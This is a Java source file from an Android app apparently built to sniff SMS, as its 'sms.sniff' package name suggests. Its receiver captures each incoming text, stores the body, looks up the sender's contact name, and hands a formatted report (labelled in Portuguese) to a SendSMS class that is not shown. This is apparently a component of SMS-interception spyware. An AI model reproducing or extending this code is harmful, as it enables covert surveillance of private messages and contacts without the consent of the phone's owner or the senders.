package sms.sniff;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class Incoming extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		Utils utils = new Utils();
		
		if(bundle != null) {
			try {
				Object[] pdus = (Object[]) bundle.get("pdus");
				msgs = new SmsMessage[pdus.length];
				for (int i=0; i < pdus.length; i++) {
					String msg = "";
					
					msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
					
					String messageBody = msgs[i].getMessageBody();
					
					Constants.lastSmsText = messageBody;
					
					String originPhoneNumber = msgs[i].getOriginatingAddress();
					
					if(originPhoneNumber.length() > 3) {
						String contactName = utils.getContactByPhoneNumber(context.getContentResolver(), originPhoneNumber);
						String time = utils.format(String.valueOf(msgs[i].getTimestampMillis()));
						
						msg += "Recebida em:" + time + "\n";
						msg += "De: " + contactName + " ("+ originPhoneNumber + ")" + "\n";
						msg += messageBody;
						
						new SendSMS(msg, originPhoneNumber);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
